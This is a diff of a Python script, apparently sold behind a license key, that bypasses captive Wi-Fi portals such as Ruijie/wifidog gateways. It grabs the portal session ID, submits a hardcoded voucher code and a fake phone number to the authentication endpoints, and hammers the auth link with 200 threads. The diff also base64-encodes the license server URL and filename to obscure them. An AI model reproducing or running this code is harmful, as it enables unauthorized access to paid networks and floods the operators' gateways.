@@ -1,15 +1,20 @@
-import requests, re, urllib3, time, threading, os, random, subprocess, sys
+import requests, re, urllib3, time, threading, os, random, subprocess, sys, base64
 from urllib.parse import urlparse, parse_qs, urljoin
 from datetime import datetime
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+# --- ENCODED CONFIG ---
+# GitHub Raw Link (Hidden)
+_0x446 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tva29hcmthcjQ0Ni1jbG91ZC9TdGFybGluay9yZWZzL2hlYWRzL21haW4va2V5LnR4dA=="
+# License Save File (Hidden)
+_0x112 = "LnN5c3RlbV9jb25maWdfZGF0YV9sb2c="
+
+def get_link(): return base64.b64decode(_0x446).decode()
+def get_file(): return base64.b64decode(_0x112).decode()
+
 # --- COLORS ---
 Y, G, R, W, C, M, OFF = "\033[1;33m", "\033[1;32m", "\033[1;31m", "\033[1;37m", "\033[1;36m", "\033[1;35m", "\033[0m"
-
-# --- CONFIG ---
-VIP_URL = "https://raw.githubusercontent.com/kokoarkar446-cloud/Starlink/refs/heads/main/key.txt"
-LICENSE_FILE = ".license_data"
 
 def get_uid():
     try: return subprocess.check_output(['whoami']).decode('utf-8').strip()
@@ -24,33 +29,34 @@ def banner(name="GUEST", exp="----/--/-- --:--"):
     print(f"{R}      ██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗")
     print(f"{R}      ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝")
     print(f"{W}╔" + "═"*60 + "╗")
-    print(f"{W}║ {Y}⚡ USER ID : {Y}{get_uid():<39} {W}║")
-    print(f"{W}║ {G}⚡ NAME    : {G}{name:<39} {W}║")
-    print(f"{W}║ {R}⚡ EXPIRE  : {R}{exp:<39} {W}║")
+    print(f"{W}║ {Y}⚡ DEVICE ID : {Y}{get_uid():<39} {W}║")
+    print(f"{W}║ {G}⚡ STATUS    : {G}{'AUTHORIZED':<39} {W}║")
+    print(f"{W}║ {R}⚡ EXPIRY    : {R}{exp:<39} {W}║")
     print(f"{W}╚" + "═"*60 + "╝\n")
 
 def check_access():
     uid = get_uid()
     now = datetime.now()
+    v_url = get_link()
+    v_file = get_file()
 
-    # ၁။ Offline စစ်ဆေးခြင်း
-    if os.path.exists(LICENSE_FILE):
+    # 1. Offline Database Check
+    if os.path.exists(v_file):
         try:
-            with open(LICENSE_FILE, "r") as f:
-                saved_data = f.read().strip().split('|')
-                if saved_data[0] == uid:
-                    v_name, v_exp_str = saved_data[1], saved_data[2]
+            with open(v_file, "r") as f:
+                d = f.read().split('|')
+                if d[0] == uid:
+                    v_name, v_exp_str = d[1], d[2]
                     expire_time = datetime.strptime(v_exp_str, "%Y-%m-%d %H:%M")
                     if now < expire_time:
                         banner(v_name, v_exp_str)
-                        print(f" {G}[✓] OFFLINE ACTIVATED! {OFF}")
                         return True
         except: pass
 
-    # ၂။ Online စစ်ဆေးခြင်း (Key မရှိလျှင် သို့ သက်တမ်းကုန်လျှင်)
+    # 2. Online Authentication
     try:
-        print(f" {Y}[*] Server မှ Key ကို စစ်ဆေးနေပါသည်...{OFF}")
-        res = requests.get(f"{VIP_URL}?t={random.random()}", timeout=10, verify=False)
+        print(f" {Y}[*] Connecting to secure server...{OFF}")
+        res = requests.get(f"{v_url}?t={random.random()}", timeout=10, verify=False)
         if res.status_code == 200:
             for line in res.text.splitlines():
                 if uid in line:
@@ -59,27 +65,26 @@ def check_access():
                     expire_time = datetime.strptime(v_exp_str, "%Y-%m-%d %H:%M")
                     
                     if now < expire_time:
-                        with open(LICENSE_FILE, "w") as f:
+                        with open(v_file, "w") as f:
                             f.write(f"{uid}|{v_name}|{v_exp_str}")
                         banner(v_name, v_exp_str)
-                        print(f" {G}[✓] KEY ACTIVATED SUCCESSFUL!{OFF}")
                         return True
                     else:
                         banner(v_name, v_exp_str)
-                        print(f" {R}[!] သက်တမ်းကုန်ဆုံးသွားပါပြီ။ Admin ထံမှာ သက်တမ်းတိုးပါ။{OFF}")
+                        print(f" {R}[!] LICENSE EXPIRED. PLEASE RENEW.{OFF}")
                         sys.exit()
 
-            # ID မရှိလျှင် ဝယ်ခိုင်းရန်
-            banner("GUEST USER", "NO LICENSE")
+            # Unauthorized UI
+            os.system('clear')
             print(f" {R}╔══════════════════════════════════════════╗")
-            print(f" ║ {R}     ACCESS DENIED (ခွင့်ပြုချက်မရှိပါ)    {R}║")
+            print(f" ║          ACCESS DENIED: NO KEY           ║")
             print(f" ╚══════════════════════════════════════════╝{OFF}")
-            print(f"\n {Y}[!] သင်၏ Device ID ကို Admin ထံပေးပို့ပြီး Key ဝယ်ယူပါ")
+            print(f"\n {Y}[!] REGISTER YOUR DEVICE ID TO ADMIN")
             print(f" {G}⚡ YOUR ID : {C}{uid}{OFF}")
-            print(f" {M}[*] ID ကို ခပ်ကြာကြာဖိပြီး Copy ကူးယူပါ။{OFF}")
+            print(f" {M}[*] Copy your ID and send to Admin.{OFF}")
             sys.exit()
     except:
-        print(f" {R}[!] အင်တာနက် မရှိပါ။ Key အသစ်စစ်ရန် အင်တာနက်လိုပါသည်။{OFF}")
+        print(f" {R}[!] CONNECTION ERROR: INTERNET REQUIRED FOR FIRST BOOT.{OFF}")
         sys.exit()
 
 def turbo_pulse(link):
@@ -93,7 +98,7 @@ def turbo_pulse(link):
 def start_speed_logic():
     session = requests.Session()
     try:
-        print(f" {W}[*] {C}Bypassing Ruijie Gateways...{OFF}")
+        print(f" {W}[*] {C}Bypassing Gateway Sequence...{OFF}")
         r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
         p_url = r.url
         r1 = session.get(p_url, verify=False, timeout=6)
@@ -103,21 +108,21 @@ def start_speed_logic():
         sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
         
         if sid:
-            print(f" {G}[✓] Authorized SID: {sid[:10]}{OFF}")
+            print(f" {G}[✓] SESSION AUTHORIZED: {sid[:10]}{OFF}")
             p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
             session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
             gw = parse_qs(urlparse(p_url).query).get('gw_address', [urlparse(p_url).netloc.split(':')[0]])[0]
             port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
             auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}&phonenumber=12345"
             
-            print(f" {M}[*] ⚡ 200 Threads Boost Active ⚡{OFF}")
+            print(f" {M}[*] ⚡ 200 HEAVY THREADS ENGAGED ⚡{OFF}")
             for _ in range(200):
                 threading.Thread(target=turbo_pulse, args=(auth_link,), daemon=True).start()
             while True:
                 time.sleep(5)
                 if requests.get("http://google.com", timeout=5).status_code != 200: break
         else:
-            print(f" {R}[!] Retry...{OFF}"); time.sleep(2); start_speed_logic()
+            print(f" {R}[!] REDIRECT FAILED. RETRYING...{OFF}"); time.sleep(2); start_speed_logic()
     except: time.sleep(3); start_speed_logic()
 
 if __name__ == "__main__":
